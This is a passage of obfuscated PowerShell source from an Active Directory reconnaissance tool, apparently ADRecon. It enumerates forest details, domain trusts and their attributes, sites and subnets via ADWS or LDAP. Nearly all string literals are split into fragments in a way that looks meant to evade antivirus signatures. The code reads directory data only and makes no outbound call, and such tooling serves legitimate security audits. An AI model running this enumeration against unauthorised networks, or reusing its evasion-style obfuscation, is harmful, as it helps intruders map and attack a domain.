                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.GlobalCatalogs.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Cate'+'gor'+'y') -Value ('Glob'+'alC'+'a'+'talog')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value $ADForest.GlobalCatalogs[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ('C'+'ategory') -Value ('To'+'mbst'+'o'+'ne Li'+'feti'+'me')
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value $ADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value ('Not '+'Retr'+'iev'+'ed')
            }
            $ForestObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ('C'+'ategor'+'y') -Value ('Recy'+'cle B'+'in (20'+'08 '+'R2'+' o'+'nwar'+'d'+'s)')
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin.EnabledScopes.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value ('Enab'+'l'+'ed')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin.EnabledScopes.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ('Cat'+'egory') -Value ('Enab'+'led S'+'co'+'pe')
                        $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value $ADRecycleBin.EnabledScopes[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value ('Disab'+'l'+'ed')
                    $ForestObj += $Obj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ('Va'+'lue') -Value ('D'+'is'+'abled')
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ('C'+'at'+'egory') -Value ('P'+'rivi'+'l'+'e'+'ge'+'d '+'Access Mana'+'ge'+'me'+'nt (2016 '+'on'+'war'+'ds)')
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement.EnabledScopes.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Va'+'lue') -Value ('Enable'+'d')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement.EnabledScopes.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ('C'+'ate'+'gory') -Value ('Ena'+'b'+'led'+' Scope')
                        $Obj | Add-Member -MemberType NoteProperty -Name ('V'+'alue') -Value $PrivilegedAccessManagement.EnabledScopes[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value ('Disab'+'led')
                    $ForestObj += $Obj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value ('Disab'+'l'+'ed')
                $ForestObj += $Obj
            }
            Remove-Variable ADForest
        }
    }

    If ($Method -eq ('L'+'DAP'))
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(('Dom'+'ain'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ('['+'Ge'+'t-ADR'+'Forest] E'+'rror getting D'+'omai'+'n Con'+'text')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(('Fo'+'r'+'est'),$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Remove-Variable ADDomain
            Try
            {
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning ('[G'+'e'+'t-A'+'D'+'RFore'+'st] Error ge'+'ttin'+'g For'+'e'+'st Con'+'t'+'e'+'xt')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable ForestContext

            # Get Tombstone Lifetime
            Try
            {
                $SearchPath = ('C'+'N='+'Di'+'r'+'ec'+'to'+'ry Se'+'rvi'+'c'+'e,CN=Windows NT'+',CN'+'=Se'+'rvi'+'ces')
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.configurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.Filter=('(name=Dir'+'ect'+'o'+'ry Serv'+'ice)')
                $objSearcherResult = $objSearcherPath.FindAll()
                $ADForestTombstoneLifetime = $objSearcherResult.Properties.tombstoneLifetime
                Remove-Variable SearchPath
                $objSearchPath.Dispose()
                $objSearcherPath.Dispose()
                $objSearcherResult.Dispose()
            }
            Catch
            {
                Write-Warning ('[Get-ADRFores'+'t] '+'Err'+'o'+'r'+' retrievi'+'ng Tom'+'bs'+'to'+'n'+'e'+' L'+'ifeti'+'me')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                Try
                {
                    $SearchPath = ('CN='+'Recycle Bin Feat'+'ure,'+'CN=Optional Fe'+'atures,CN=Direc'+'tory '+'Servi'+'ce'+',CN=Windows '+'NT,C'+'N='+'S'+'ervice'+'s'+',CN=C'+'onfigur'+'ation')
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                    $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                    $ADRecycleBin = $objSearcherPath.FindAll()
                    Remove-Variable SearchPath
                    $objSearchPath.Dispose()
                    $objSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning ('['+'Get-AD'+'RFores'+'t'+'] '+'E'+'r'+'ror ret'+'rie'+'ving Recycle Bin Fe'+'at'+'u'+'re')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            # Check Privileged Access Management Feature status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                Try
                {
                    $SearchPath = ('CN=Pr'+'ivi'+'l'+'eged'+' Access M'+'anagem'+'ent Fe'+'ature,CN'+'=Opt'+'io'+'na'+'l F'+'eat'+'ures,CN=Direc'+'t'+'ory Service,CN=W'+'indows NT,'+'CN=Services,C'+'N=Con'+'f'+'igura'+'tion')
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                    $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                    $PrivilegedAccessManagement = $objSearcherPath.FindAll()
                    Remove-Variable SearchPath
                    $objSearchPath.Dispose()
                    $objSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning ('[Get'+'-ADRFores'+'t]'+' '+'Erro'+'r retri'+'evi'+'ng P'+'ri'+'vileged'+' Access Manage'+'ment F'+'e'+'ature')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

            # Get Tombstone Lifetime
            $ADForestTombstoneLifetime = ([ADSI]"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,$($objDomainRootDSE.configurationNamingContext) ").tombstoneLifetime.value

            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                $ADRecycleBin = ([ADSI]"LDAP://CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
            # Check Privileged Access Management Feature Status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                $PrivilegedAccessManagement = ([ADSI]"LDAP://CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
        }

        If ($ADForest)
        {
            $ForestObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
	            0 = ('Window'+'s'+'200'+'0');
	            1 = ('Wi'+'n'+'do'+'ws'+'2003/'+'In'+'terim');
	            2 = ('Wind'+'ow'+'s200'+'3');
	            3 = ('Wi'+'ndows20'+'08');
	            4 = ('Win'+'d'+'ows2008R2');
	            5 = ('W'+'indows'+'2012');
	            6 = ('Wi'+'ndows201'+'2'+'R2');
                7 = ('Windo'+'ws20'+'16')
            }
            $ForestMode = $FLAD[[convert]::ToInt32($objDomainRootDSE.forestFunctionality,10)] + ('F'+'orest')
            Remove-Variable FLAD

            $ObjValues = @(('Nam'+'e'), $ADForest.Name, ('Fu'+'nction'+'al Le'+'v'+'el'), $ForestMode, ('Dom'+'ain'+' Naming '+'Master'), $ADForest.NamingRoleOwner, ('Schema Ma'+'s'+'ter'), $ADForest.SchemaRoleOwner, ('Root'+'D'+'o'+'main'), $ADForest.RootDomain, ('D'+'omai'+'n '+'Count'), $ADForest.Domains.Count, ('Sit'+'e'+' Count'), $ADForest.Sites.Count, ('Global C'+'ata'+'l'+'og C'+'o'+'unt'), $ADForest.GlobalCatalogs.Count)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('C'+'ategor'+'y') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name ('V'+'alue') -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ForestMode

            For($i=0; $i -lt $ADForest.Domains.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Cate'+'g'+'ory') -Value ('Doma'+'in')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Va'+'lue') -Value $ADForest.Domains[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.Sites.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Ca'+'teg'+'ory') -Value ('Sit'+'e')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value $ADForest.Sites[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.GlobalCatalogs.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Ca'+'t'+'egory') -Value ('Gl'+'ob'+'alCatalo'+'g')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value $ADForest.GlobalCatalogs[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ('C'+'atego'+'ry') -Value ('Tomb'+'st'+'one '+'L'+'ifetim'+'e')
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value $ADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value ('Not Re'+'t'+'rieved')
            }
            $ForestObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ('Categ'+'ory') -Value ('Recy'+'c'+'le Bin '+'(2008'+' R2 onwa'+'r'+'d'+'s)')
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin.Properties.'msDS-EnabledFeatureBL'.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ('V'+'alue') -Value ('Enable'+'d')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin.Properties.'msDS-EnabledFeatureBL'.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ('Cate'+'gor'+'y') -Value ('En'+'abled Sc'+'op'+'e')
                        $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value $ADRecycleBin.Properties.'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value ('Di'+'sable'+'d')
                    $ForestObj += $Obj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value ('D'+'isabled')
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ('Cat'+'egory') -Value ('Privil'+'eg'+'ed Acces'+'s Ma'+'nage'+'m'+'ent ('+'2'+'01'+'6 onw'+'ards'+')')
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value ('En'+'abled')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ('Cat'+'ego'+'ry') -Value ('En'+'able'+'d'+' Scope')
                        $Obj | Add-Member -MemberType NoteProperty -Name ('Va'+'lue') -Value $PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ('V'+'alue') -Value ('Dis'+'abl'+'ed')
                    $ForestObj += $Obj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ('Va'+'lue') -Value ('Di'+'sabled')
                $ForestObj += $Obj
            }

            Remove-Variable ADForest
        }
    }

    If ($ForestObj)
    {
        Return $ForestObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRTrust
{
<#
.SYNOPSIS
    Returns the Trusts of the current (or specified) domain.

.DESCRIPTION
    Returns the Trusts of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    # Values taken from https://msdn.microsoft.com/en-us/library/cc223768.aspx
    $TDAD = @{
        0 = ('Disabl'+'e'+'d');
        1 = ('Inbo'+'und');
        2 = ('Out'+'bo'+'und');
        3 = ('BiD'+'irec'+'tiona'+'l');
    }

    # Values taken from https://msdn.microsoft.com/en-us/library/cc223771.aspx
    $TTAD = @{
        1 = ('Do'+'w'+'nlevel');
        2 = ('Up'+'level');
        3 = ('MI'+'T');
        4 = ('DC'+'E');
    }

    If ($Method -eq ('ADW'+'S'))
    {
        Try
        {
            $ADTrusts = Get-ADObject -LDAPFilter ('(obj'+'ectClas'+'s'+'=tr'+'u'+'s'+'tedDoma'+'in)') -Properties DistinguishedName,trustPartner,trustdirection,trusttype,TrustAttributes,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning ('[Get-'+'AD'+'RTrust'+']'+' E'+'rro'+'r whil'+'e en'+'u'+'m'+'er'+'atin'+'g'+' tr'+'ust'+'edDomain Ob'+'jects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.ADWSClass]::ObjectCount($ADTrusts)) "
            # Trust Info
            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Source D'+'omai'+'n') -Value (Get-DNtoFQDN $_.DistinguishedName)
                $Obj | Add-Member -MemberType NoteProperty -Name ('Target Dom'+'ai'+'n') -Value $_.trustPartner
                $TrustDirection = [string] $TDAD[$_.trustdirection]
                $Obj | Add-Member -MemberType NoteProperty -Name ('T'+'rus'+'t'+' Di'+'rection') -Value $TrustDirection
                $TrustType = [string] $TTAD[$_.trusttype]
                $Obj | Add-Member -MemberType NoteProperty -Name ('Tr'+'ust Ty'+'pe') -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_.TrustAttributes -band 0x00000001) { $TrustAttributes += ('Non T'+'ra'+'nsitive'+',') }
                If ([int32] $_.TrustAttributes -band 0x00000002) { $TrustAttributes += ('Up'+'Level'+',') }
                If ([int32] $_.TrustAttributes -band 0x00000004) { $TrustAttributes += ('Quaran'+'ti'+'n'+'ed,') } #SID Filtering
                If ([int32] $_.TrustAttributes -band 0x00000008) { $TrustAttributes += ('Fore'+'s'+'t '+'Tra'+'nsitive'+',') }
                If ([int32] $_.TrustAttributes -band 0x00000010) { $TrustAttributes += ('Cross '+'O'+'rganiza'+'ti'+'on,') } #Selective Auth
                If ([int32] $_.TrustAttributes -band 0x00000020) { $TrustAttributes += ('W'+'i'+'thi'+'n '+'Forest,') }
                If ([int32] $_.TrustAttributes -band 0x00000040) { $TrustAttributes += ('Treat'+' as Ex'+'t'+'ern'+'al,') }
                If ([int32] $_.TrustAttributes -band 0x00000080) { $TrustAttributes += ('Uses '+'RC'+'4 En'+'crypt'+'ion,') }
                If ([int32] $_.TrustAttributes -band 0x00000200) { $TrustAttributes += ('N'+'o T'+'GT '+'Delegatio'+'n,') }
                If ([int32] $_.TrustAttributes -band 0x00000400) { $TrustAttributes += ('PIM '+'Tru'+'s'+'t,') }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.TrimEnd(",")
                }
                $Obj | Add-Member -MemberType NoteProperty -Name ('Att'+'ribu'+'tes') -Value $TrustAttributes
                $Obj | Add-Member -MemberType NoteProperty -Name ('w'+'h'+'enCr'+'eated') -Value ([DateTime] $($_.whenCreated))
                $Obj | Add-Member -MemberType NoteProperty -Name ('w'+'henC'+'hanged') -Value ([DateTime] $($_.whenChanged))
                $ADTrustObj += $Obj
            }
            Remove-Variable ADTrusts
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ('('+'objectClass=tr'+'us'+'ted'+'Dom'+'a'+'in)')
        $ObjSearcher.PropertiesToLoad.AddRange((('dist'+'i'+'nguis'+'hedn'+'ame'),('tr'+'u'+'stpar'+'tner'),('t'+'rustd'+'ir'+'ectio'+'n'),('tr'+'us'+'ttype'),('tru'+'stat'+'tri'+'butes'),('wh'+'encreate'+'d'),('whe'+'nch'+'an'+'ged')))
        $ObjSearcher.SearchScope = ('Sub'+'tree')

        Try
        {
            $ADTrusts = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Ge'+'t-ADRTrus'+'t] Error whil'+'e'+' enumerating trus'+'t'+'edD'+'o'+'ma'+'in Obje'+'cts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.LDAPClass]::ObjectCount($ADTrusts)) "
            # Trust Info
            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Source D'+'oma'+'in') -Value $(Get-DNtoFQDN ([string] $_.Properties.distinguishedname))
                $Obj | Add-Member -MemberType NoteProperty -Name ('T'+'a'+'rget D'+'omain') -Value $([string] $_.Properties.trustpartner)
                $TrustDirection = [string] $TDAD[$_.Properties.trustdirection]
                $Obj | Add-Member -MemberType NoteProperty -Name ('Trust D'+'ire'+'ct'+'ion') -Value $TrustDirection
                $TrustType = [string] $TTAD[$_.Properties.trusttype]
                $Obj | Add-Member -MemberType NoteProperty -Name ('T'+'r'+'ust Type') -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000001) { $TrustAttributes += ('N'+'on Transiti'+'ve'+',') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000002) { $TrustAttributes += ('UpLe'+'vel'+',') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000004) { $TrustAttributes += ('Qua'+'ra'+'n'+'tined,') } #SID Filtering
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000008) { $TrustAttributes += ('Forest'+' Trans'+'i'+'ti'+'v'+'e,') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000010) { $TrustAttributes += ('Cross'+' O'+'rg'+'an'+'izati'+'on'+',') } #Selective Auth
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000020) { $TrustAttributes += ('Wi'+'thin F'+'orest,') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000040) { $TrustAttributes += ('Treat as'+' Ex'+'t'+'ernal,') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000080) { $TrustAttributes += ('Use'+'s '+'R'+'C'+'4 Enc'+'ryp'+'tion,') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000200) { $TrustAttributes += ('N'+'o '+'TGT '+'Delegat'+'ion'+',') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000400) { $TrustAttributes += ('P'+'IM'+' Trust,') }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.TrimEnd(",")
                }
                $Obj | Add-Member -MemberType NoteProperty -Name ('Attr'+'ibu'+'tes') -Value $TrustAttributes
                $Obj | Add-Member -MemberType NoteProperty -Name ('w'+'henCreate'+'d') -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name ('w'+'h'+'enCha'+'nged') -Value ([DateTime] $($_.Properties.whenchanged))
                $ADTrustObj += $Obj
            }
            Remove-Variable ADTrusts
        }
    }

    If ($ADTrustObj)
    {
        Return $ADTrustObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRSite
{
<#
.SYNOPSIS
    Returns the Sites of the current (or specified) domain.

.DESCRIPTION
    Returns the Sites of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ('A'+'DWS'))
    {
        Try
        {
            $SearchPath = ('CN=Si'+'t'+'es')
            $ADSites = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ('(obje'+'ct'+'C'+'lass=site'+')') -Properties Name,Description,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning ('[Get-ADRS'+'ite'+'] E'+'rror w'+'hil'+'e enumera'+'ti'+'ng'+' Sit'+'e'+' Objects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.ADWSClass]::ObjectCount($ADSites)) "
            # Sites Info
            $ADSiteObj = @()
            $ADSites | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Na'+'me') -Value $_.Name
                $Obj | Add-Member -MemberType NoteProperty -Name ('De'+'script'+'i'+'on') -Value $_.Description
                $Obj | Add-Member -MemberType NoteProperty -Name ('whe'+'nCre'+'a'+'ted') -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name ('whe'+'nCha'+'nge'+'d') -Value $_.whenChanged
                $ADSiteObj += $Obj
            }
            Remove-Variable ADSites
        }
    }

    If ($Method -eq ('LD'+'AP'))
    {
        $SearchPath = ('CN'+'=Sites')
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = ('(obj'+'ectCla'+'ss=sit'+'e)')
        $ObjSearcher.SearchScope = ('Subt'+'r'+'ee')

        Try
        {
            $ADSites = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('['+'Get-A'+'DRSite] Er'+'r'+'o'+'r '+'whil'+'e enu'+'m'+'erating Site'+' O'+'bjec'+'t'+'s')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.LDAPClass]::ObjectCount($ADSites)) "
            # Site Info
            $ADSiteObj = @()
            $ADSites | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Na'+'me') -Value $([string] $_.Properties.name)
                $Obj | Add-Member -MemberType NoteProperty -Name ('Descr'+'iptio'+'n') -Value $([string] $_.Properties.description)
                $Obj | Add-Member -MemberType NoteProperty -Name ('whenCre'+'ate'+'d') -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name ('whe'+'nC'+'hange'+'d') -Value ([DateTime] $($_.Properties.whenchanged))
                $ADSiteObj += $Obj
            }
            Remove-Variable ADSites
        }
    }

    If ($ADSiteObj)
    {
        Return $ADSiteObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRSubnet
{
<#
.SYNOPSIS
    Returns the Subnets of the current (or specified) domain.

.DESCRIPTION
    Returns the Subnets of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ('ADW'+'S'))
    {
        Try
        {
            $SearchPath = ('CN=Su'+'bnets,CN'+'=Sit'+'es')
            $ADSubnets = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ('(obje'+'ctCla'+'s'+'s=s'+'ubn'+'et)') -Properties Name,Description,siteObject,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning ('[G'+'et-AD'+'R'+'Subn'+'et'+'] Erro'+'r'+' wh'+'il'+'e e'+'numerating'+' S'+'u'+'bnet '+'Obj'+'ects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.ADWSClass]::ObjectCount($ADSubnets)) "
            # Subnets Info
            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Sit'+'e') -Value $(($_.siteObject -Split ",")[0] -replace ('C'+'N='),'')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Na'+'me') -Value $_.Name
                $Obj | Add-Member -MemberType NoteProperty -Name ('D'+'es'+'cr'+'iption') -Value $_.Description
